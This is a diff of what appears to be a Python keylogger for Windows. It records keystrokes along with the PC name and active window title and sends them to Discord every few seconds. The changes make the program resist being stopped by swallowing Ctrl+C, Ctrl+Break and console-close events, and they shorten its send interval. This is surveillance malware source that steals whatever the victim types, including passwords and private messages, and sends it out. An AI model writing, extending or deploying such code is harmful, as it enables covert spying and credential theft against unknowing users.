@@ -96,7 +96,17 @@ def handle_exit(sig):
     log_system_shutdown()
     os._exit(1)
 
-win32api.SetConsoleCtrlHandler(handle_exit, True)
+def console_control_handler(control_event):
+    if control_event in (
+        win32api.CTRL_C_EVENT,
+        win32api.CTRL_BREAK_EVENT,
+        win32api.CTRL_CLOSE_EVENT
+    ):
+        log_system_shutdown()
+        return True
+    return False
+
+win32api.SetConsoleCtrlHandler(console_control_handler, True)
 
 # Function to get active window title
 def get_active_window_title():
@@ -120,7 +130,7 @@ def send_keystrokes():
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             message = f"[{timestamp}] {PC_NAME} - ({keystroke_app} - {keystroke_window}): {keystrokes}"
-            send_to_discord("KEYLOG", message, 0)  # Yellow
+            send_to_discord("KEYLOG", message, 16777215)  # Yellow
             keystrokes = ""
             keystroke_app, keystroke_window = "Unknown", "Unknown"
 
@@ -152,7 +162,7 @@ listener.start()
 # Function to periodically send keystrokes
 def keystroke_monitor():
     while True:
-        time.sleep(5)  # Check every second
+        time.sleep(3)  # Check every 3 second
         send_keystrokes()
 
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
@@ -184,7 +194,7 @@ def monitor_idle_time():
     while True:
         time.sleep(1)  # Check every second
         idle_duration = get_idle_duration()
-        if idle_duration >= 5:  # 10 seconds of inactivity
+        if idle_duration >= 5:  # 5 seconds of inactivity
             log_idle_connection(idle_duration)
 
 def log_idle_connection(duration):
